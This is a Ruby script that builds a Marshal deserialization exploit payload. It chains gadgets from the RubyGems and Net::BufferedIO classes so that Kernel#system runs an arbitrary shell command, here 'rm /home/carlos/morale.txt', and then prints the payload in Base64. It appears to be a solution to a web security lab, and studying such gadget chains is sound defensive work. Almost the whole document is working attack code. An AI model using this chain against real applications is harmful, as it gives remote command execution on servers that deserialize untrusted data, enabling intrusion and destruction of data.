
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer
require 'base64'
require 'uri'

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

# 创建自定义适配器类来替代Net::WriteAdapter
class CustomWriteAdapter
  def initialize(target, method_name)
    @target = target
    @method_name = method_name
  end
  
  def write(data)
    @target.send(@method_name, data)
  end
end

# 使用自定义适配器
wa1 = CustomWriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = CustomWriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts "Payload generated successfully"
puts "Payload size: #{payload.bytesize} bytes"


puts "\n序列化载荷 Base64:"
base64_encoded_str = Base64.strict_encode64(payload)
puts "编码后: \n#{base64_encoded_str}"
